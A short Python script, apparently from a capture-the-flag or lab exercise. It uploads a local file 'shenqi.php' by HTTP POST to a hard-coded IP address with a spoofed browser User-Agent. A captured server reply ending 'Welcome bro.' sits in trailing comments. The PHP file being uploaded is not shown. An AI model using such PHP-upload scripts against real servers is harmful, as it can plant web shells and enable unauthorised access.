import requests


url = 'http://101.43.66.67:8001/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
}
data = {
    'data': 'shenqi'
}
files = {
    'php': ('shenqi.php', open("shenqi.php", 'rb'))
}
res = requests.post(url=url, data=data, headers=headers, files=files).text
print(res)

# <code><span style="color: #000000">
# <br />}</span>
# </span>
# </code>Welcome bro.